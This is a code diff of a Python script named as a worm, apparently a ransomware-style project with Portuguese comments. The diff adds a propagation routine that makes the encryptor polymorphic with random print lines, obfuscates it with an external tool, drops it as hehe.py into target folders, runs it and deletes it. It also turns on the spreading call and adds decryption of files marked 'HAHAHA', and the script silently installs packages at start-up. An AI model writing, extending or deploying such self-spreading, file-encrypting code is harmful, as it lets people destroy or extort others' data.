@@ -2,17 +2,11 @@ import os
 os.system("pip install pypiwin32 pyinstaller pycryptodome cryptography > /dev/null 2>&1") # /dev/null 2>&1 -> esconder o output
 import sys
 import time
-import threading
 import shutil
 import win32con
 import win32gui
 import random
 from cryptography.fernet import Fernet
-from os import system
-
-import base64
-from Crypto import Random
-from Crypto.Cipher import AES
 
 ROOTDIR = r"C:\\"
 THIS_DIR = os.path.dirname(os.path.realpath(__file__))
@@ -23,7 +17,6 @@ class Worm:
     def __init__(self):
         self.target_dir_list = []
         self.directories_found = False
-        self.own_path = os.path.realpath(__file__) # pode ser usado para apenas não encriptar a diretoria da worm
 
     def find_directories(self):
         for dirpath, dirnames, _ in os.walk(ROOTDIR):
@@ -38,50 +31,64 @@ class Worm:
                     except PermissionError:
                         pass
 
+        print("[*] Found " + str(len(self.target_dir_list)) + " targetable directories.")
         self.directories_found = True
 
     def spread(self):
-        this = open(ENCRYPTOR_PATH, "r")
-        worm_poli = ""
-        times = random.randrange(1, 25)
-        for i in range(times):
-            num = random.randrange(-sys.maxsize, sys.maxsize)
-            worm_poli += "print(" + str(num) + ")\n"
+        with open(ENCRYPTOR_PATH, "r") as f:
+            encryptor = f.read()
 
-        worm_poli += "\n"
+        for target in ["C:\\Users\\w0rmer\\Downloads\\test", "C:\\Users\\w0rmer\\Downloads\\test2"]:
+            times = random.randrange(1, 25)
+            for i in range(times):
+                num = random.randrange(-sys.maxsize, sys.maxsize)
+                encryptor = "print(" + str(num) + ")\n" + encryptor
 
-        for line in this:
-            worm_poli += line
+            with open("to_infect.py", "w") as tf:
+                tf.write(encryptor)
 
-        target_list = ["C:/Users/w0rmer/Downloads/test"]
+            os.system("python.exe ./py_fuscate.py -i to_infect.py -o to_infect_o.py -c 100")
 
-        for target in target_list:
-            shutil.copy(ENCRYPTOR_PATH, target + "/csgo.py")
-            system("cd " + target + " && python.exe csgo.py && cd " + THIS_DIR)
-            os.remove(target + "/csgo.py")
-
+            count = 0
+            try:
+                with open(target + "/hehe.py", "w") as f:
+                    with open("to_infect_o.py", "r") as fe:
+                        f.write(fe.read())
+                os.system("cd " + target + " && python.exe hehe.py && cd " + THIS_DIR)
+                os.remove(target + "/hehe.py")
+            except PermissionError:
+                pass
 
     def decrypt_files(self):
-        for (_, _, filenames) in os.walk(THIS_DIR):
-            break
+        count = 0
+        for target in ["C:\\Users\\w0rmer\\Downloads\\test", "C:\\Users\\w0rmer\\Downloads\\test2"]:
+            try:
+                for (_, _, filenames) in os.walk(target):
+                    break
 
-        fer = Fernet(KEY)
+                fer = Fernet(KEY)
 
-        for file in filenames:
-            if file.endswith("HAHAHA"):
-                with open(file, "rb") as f:
-                    data = f.read()
+                for file in filenames:
+                    if file.endswith("HAHAHA"):
+                        with open(target + file, "rb") as f:
+                            data = f.read()
 
-                decrypted = fer.decrypt(data)
+                        decrypted = fer.decrypt(data)
 
-                with open(file.split("HAHAHA")[0], "wb") as file_dec:
-                    file_dec.write(decrypted)
+                        with open(target + file.split("HAHAHA")[0], "wb") as file_dec:
+                            file_dec.write(decrypted)
+                        os.remove(target + file)
+                        count += 1
+            except PermissionError:
+                pass
+
+        print("[*] " + str(count) + " files were decrypted!")
 
     def execute_worm(self):
         if not self.directories_found:
             self.find_directories()
 
-        # self.spread()
+        self.spread()
 
 def banner_func():
     print("""
@@ -102,7 +109,7 @@ def worm_menu():
     print(' --------------------------------- ')
 
 if __name__ == "__main__":
-    system("cls")
+    os.system("cls")
     banner_func()
 
     worm = Worm()
